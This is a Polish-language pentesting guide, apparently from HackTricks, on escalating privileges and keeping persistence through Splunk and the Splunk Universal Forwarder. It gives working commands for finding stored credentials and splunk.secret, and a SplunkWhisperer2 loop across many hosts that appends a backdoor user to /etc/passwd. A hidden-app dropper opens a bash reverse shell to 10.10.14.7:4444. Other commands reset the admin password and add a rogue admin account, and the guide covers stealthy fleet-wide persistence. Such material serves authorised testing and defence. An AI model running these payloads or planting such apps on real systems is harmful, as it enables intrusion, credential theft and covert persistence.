# Splunk LPE i Persistence

{{#include ../../banners/hacktricks-training.md}}

Jeśli podczas **enumerating** maszyny **wewnętrznie** lub **zewnętrznie** znajdziesz **uruchomiony Splunk** (zwykle **8000** dla web UI i **8089** dla management API), prawidłowe dane uwierzytelniające często można wykorzystać do uzyskania **code execution** poprzez instalację aplikacji, scripted inputs lub działania administracyjne. Jeśli Splunk działa jako **root**, często prowadzi to do natychmiastowego **privilege escalation**.

Jeśli potrzebujesz tylko informacji o ogólnej remote attack surface, enumeracji lub ścieżce app-upload RCE, sprawdź:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Jeśli **już masz uprawnienia root**, a usługa Splunk nie nasłuchuje wyłącznie na localhost, możesz również wykraść **Splunk password hashes**, odzyskać **encrypted secrets** lub wdrożyć **malicious app**, aby utrzymać persistence lokalnie lub na wielu forwarderach.

## Interesujące pliki lokalne

Po uzyskaniu dostępu do hosta z uruchomionym Splunk lub Splunk Universal Forwarder te ścieżki są zwykle najbardziej interesujące:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Ważne artefakty:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni użytkownicy Splunk i hashe haseł.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: klucz używany przez Splunk do szyfrowania sekretów przechowywanych w kilku plikach `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: początkowy plik bootstrapu administratora; przydatny w gold images i przypadku błędów provisioningu. Jest ignorowany, jeśli `etc/passwd` już istnieje.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: miejsce, w którym często włączane są scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** lub **`$SPLUNK_HOME/etc/apps/`**: dobre miejsca do ukrycia persistent app lub sprawdzenia, co jest już dystrybuowane.

## Podsumowanie exploita Splunk Universal Forwarder Agent

Więcej informacji znajdziesz na stronie [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie:

**Opis exploita:**
Exploit atakujący Splunk Universal Forwarder (UF) umożliwia napastnikom posiadającym **hasło agenta** wykonywanie dowolnego kodu w systemach, na których działa agent, co potencjalnie może prowadzić do przejęcia znacznej części środowiska.

**Dlaczego działa:**

- Usługa zarządzania UF jest często dostępna na **TCP 8089**.
- Napastnicy mogą uwierzytelnić się do API i nakazać forwarderowi zainstalowanie **złośliwego pakietu aplikacji**.
- Ten sam mechanizm może być używany lokalnie do **LPE** lub zdalnie do **RCE**.
- Publicznie dostępne narzędzia, takie jak **SplunkWhisperer2**, automatycznie tworzą pakiet aplikacji i mogą dostosowywać payloady do celów Linux.

**Typowe sposoby odzyskania hasła:**

- Dane uwierzytelniające w cleartext w dokumentacji, skryptach, udziałach lub automatyzacji deploymentu.
- Hashe haseł w `$SPLUNK_HOME/etc/passwd`, a następnie offline cracking.
- Golden images lub pozostałości provisioningu, takie jak `user-seed.conf`.

**Skutki:**

- Wykonywanie kodu z uprawnieniami SYSTEM/root na każdym przejętym hoście.
- Deployment persistent apps, backdoorów lub ransomware.
- Wyłączanie albo manipulowanie telemetry data przed ich przekazaniem.

**Przykładowe polecenie do przeprowadzenia exploita:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Dostępne publiczne exploity:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence przez Scripted Inputs lub Malicious Apps

Jeśli masz **dostęp do zapisu w systemie plików** jako `root`/`splunk` lub uwierzytelniony dostęp umożliwiający instalowanie aplikacji, bardzo niezawodnym mechanizmem persistence jest umieszczenie **custom app** z **scripted input**. Własna dokumentacja Splunk zakłada, że scripted inputs znajdują się w katalogu aplikacji i są włączane za pomocą `inputs.conf`.

Typowy układ:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalny `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Szybki dropper dla Linuxa:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notatki:

- Ta sama sztuczka działa w przypadku **Universal Forwarder** przy użyciu `/opt/splunkforwarder/etc/apps/`.
- Atakujący często wtapiają się w środowisko, modyfikując legalny add-on zamiast tworzyć ewidentnie malicious app.
- Na **deployment server** umieszczenie malicious app w `deployment-apps/` prowadzi do **fleet-wide persistence**, ponieważ forwardery odpytują serwer, pobierają zaktualizowane aplikacje i często uruchamiają się ponownie, aby je zastosować.

## Kradzież poświadczeń i przejęcie konta admina

Jeśli możesz odczytywać lokalne pliki Splunka, zwykle istnieją dwa dobre cele: odzyskanie **dostępu admina do Splunka** oraz odzyskanie **zaszyfrowanych poświadczeń usług**.

### Hashes haseł i lokalni użytkownicy

Splunk przechowuje lokalne dane uwierzytelniania w `etc/passwd`. W zależności od wdrożenia złamanie tego pliku może pozwolić odzyskać działające poświadczenia dla web UI i management API.

Jeśli masz już prawidłowe poświadczenia **admina**, a Splunk używa swojego **native** backendu uwierzytelniania, samo CLI może zostać użyte do persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i zaszyfrowane wartości

Splunk używa `etc/auth/splunk.secret` do ochrony poufnych wartości przechowywanych w wielu plikach konfiguracyjnych. Jeśli uda Ci się ukraść zarówno **secret**, jak i odpowiednie pliki **`.conf`**, często możesz odzyskać lub ponownie wykorzystać:

- współdzielone sekrety forwardera/indexera, takie jak `pass4SymmKey`
- hasła kluczy prywatnych TLS, takie jak `sslPassword`
- dane uwierzytelniające LDAP bind, takie jak `bindDNPassword`

Jest to przydatne podczas **lateral movement**, nawet jeśli hasła administratora Splunk nie da się złamać.

### Nadużycie `user-seed.conf`

`user-seed.conf` jest używany tylko podczas pierwszego uruchomienia lub gdy `etc/passwd` nie istnieje. Z tego powodu jest mniej przydatny na działającym systemie, ale bardzo interesujący w przypadku:

- przejętych szablonów instalacyjnych
- obrazów kontenerów
- procesów unattended provisioning
- urządzeń, na których Splunk jest automatycznie ponownie inicjalizowany

W takich przypadkach umieszczenie `HASHED_PASSWORD` wygenerowanego za pomocą `splunk hash-passwd` daje cichy sposób na odzyskanie dostępu administratora po ponownym wdrożeniu.

## Nadużywanie zapytań Splunk

Więcej szczegółów znajdziesz pod adresem [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Przydatna, stosunkowo nowa technika polega na nadużyciu **XSLT dostarczanego przez użytkownika** w podatnych wersjach Splunk Enterprise w celu przekształcenia uwierzytelnionego konta o niskich uprawnieniach w możliwość **wykonywania poleceń systemu operacyjnego** jako użytkownik `splunk`.

Przepływ na wysokim poziomie:

1. Uwierzytelnij się w Splunk.
2. Prześlij złośliwy plik **XSL** za pomocą funkcji podglądu/przesyłania.
3. Spraw, aby Splunk renderował wyniki wyszukiwania przy użyciu przesłanego arkusza stylów z katalogu **dispatch**.
4. Użyj payloadu XSLT do zapisania pliku lub wywołania wykonania za pośrednictwem pipeline'u wyszukiwania Splunk (na przykład poprzez dotarcie do wewnętrznej funkcji takiej jak `runshellscript`).

Najważniejszy wniosek z perspektywy ofensywnej jest taki, że ta ścieżka zapewnia **post-auth RCE bez potrzeby app upload**. W systemie Linux zwykle uzyskuje się dostęp jako konto **`splunk`**, co nadal jest wartościowe, ponieważ ten użytkownik często jest właścicielem drzewa aplikacji, może odczytywać sekrety i umieszczać persistent apps, które przetrwają utratę powłoki.

Reprezentatywna ścieżka używana podczas exploitation to:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Jeśli Splunk działa ze zbyt wieloma uprawnieniami lub użytkownik `splunk` ma dostęp do niebezpiecznych skryptów, zapisywalnych jednostek usług albo niebezpiecznych reguł `sudo`, powstaje prosty łańcuch **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
